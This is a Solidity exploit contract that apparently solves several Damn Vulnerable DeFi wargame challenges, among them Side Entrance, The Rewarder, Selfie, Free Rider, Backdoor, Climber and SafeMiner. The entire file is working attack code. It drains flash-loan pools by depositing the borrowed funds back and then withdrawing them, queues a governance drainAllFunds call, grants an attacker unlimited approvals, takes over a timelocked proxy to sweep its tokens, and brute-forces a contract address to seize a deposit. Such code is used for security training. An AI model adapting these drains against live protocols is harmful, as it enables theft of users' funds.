// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "forge-std/console.sol";

contract Hack {
    address tknLp; //#5 The Rewarder
    address toCall; //#5 The Rewarder

    address sweeper; //#12 Climber
    address[] targets; //#12 Climber
    uint256[] values; //#12 Climber
    bytes[] dataElements; //#12 Climber
    bytes32 salt; //#12 Climber
    receive() external payable {}

    function initSideEntrance(address _fLoanPool, uint256 _amt) external payable { //#4 Side entrance
        _fLoanPool.call(abi.encodeWithSignature("flashLoan(uint256)", _amt));
        _fLoanPool.call(abi.encodeWithSignature("withdraw()"));
        payable(msg.sender).transfer(_amt);
    }

    function execute() external payable {
        msg.sender.call{value: msg.value}(abi.encodeWithSignature("deposit()")); //#4 Side entrance
    }

    function initTheRewarder( //#5 The Rewarder
        address _fLoanPool,
        uint256 _amt,
        address _tknLp,
        address _tknReward,
        address _theRewarderPool,
        bool _sendToAttacker
    ) external payable {
        tknLp = _tknLp;
        toCall = _theRewarderPool;

        _fLoanPool.call(abi.encodeWithSignature("flashLoan(uint256)", _amt));

        if(_sendToAttacker){ //2nd time (after 5 days)
            (bool s, bytes memory data) = _tknReward.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
            (uint256 balance) = abi.decode(data, (uint256));
            _tknReward.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, balance));
        }
    }

    function receiveFlashLoan(uint256 _amt) public payable { //#5 The Rewarder
        tknLp.call(abi.encodeWithSignature("approve(address,uint256)", toCall, _amt));
        toCall.call(abi.encodeWithSignature("deposit(uint256)", _amt)); //reward pool
        toCall.call(abi.encodeWithSignature("withdraw(uint256)", _amt));
        tknLp.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, _amt));
    }

    function initSelfie(address _pool, uint256 _amt, address _gov) public payable { //#6 Selfie
        toCall = _gov;
        _pool.call(abi.encodeWithSignature("flashLoan(uint256)", _amt));
    }

    function receiveTokens(address _tkn, uint256 _amt) public payable { //#6 Selfie
        bytes memory drainPayload = abi.encodeWithSignature("drainAllFunds(address)", tx.origin);

        _tkn.call(abi.encodeWithSignature("snapshot()"));
        toCall.call(abi.encodeWithSignature("queueAction(address,bytes,uint256)", //gov
            msg.sender,
            drainPayload,
            0
        ));
        _tkn.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, _amt));
    }

    function initFreeRaider(address _lp, uint256 _amt0, uint256 _amt1, bytes calldata _payload) public payable { //#10 Free raider
        _lp.call(abi.encodeWithSignature("swap(uint256,uint256,address,bytes)", _amt0, _amt1, address(this), _payload));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata _payload) external payable { //#10 Free raider
        (address[] memory addrsTo, bytes[] memory payloads, uint[] memory amts) = abi.decode(_payload, (address[], bytes[], uint[]));

        for(uint i=0; i<addrsTo.length;i++){
            addrsTo[i].call{value: amts[i]}(payloads[i]);
        }
    }

    function onERC721Received( address, address, uint256, bytes memory) external returns (bytes4) { //#10 Free Rider
        return this.onERC721Received.selector;
    }

    function fowardApprove(address _tkn, address _attacker) public payable { // #11 Backdoor
        _tkn.call(abi.encodeWithSignature("approve(address,uint256)", _attacker, type(uint256).max));
    }

    function initClimber(address[] memory _targets, uint256[] memory _values, bytes[] memory _dataElements, bytes32 _salt) public { //#12 Climber
        targets = _targets;
        values = _values;
        dataElements = _dataElements;
        salt = _salt;
    }

    function scheduleViaHack(address _timelock) public { //#12 Climber
        _timelock.call(abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, salt));
    }

    function proxiableUUID() public view returns(bytes32) { //#12 Climber
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function sweepFunds(address _tkn) external { //#12 Climber
        _tkn.call(abi.encodeWithSignature("transfer(address,uint256)", tx.origin, 10_000_000e18));
    }

    function initSafeMiner(address _addrDeposit, address _addrTkn, uint256 _amt) public returns(bool){ //#13 SafeMiner
        HackSafeMiner hackSafeMiner;
        for(uint i=0;i<100;i++){
            hackSafeMiner = new HackSafeMiner(_addrTkn, _amt);
            if(address(hackSafeMiner)==_addrDeposit){
                return true;
            }
        }
    }
}

contract HackSafeMiner { //#13 SafeMiner
    constructor(address _tkn, uint256 _amt){
        _tkn.call(abi.encodeWithSignature("transfer(address,uint256)", tx.origin, _amt));
    }
}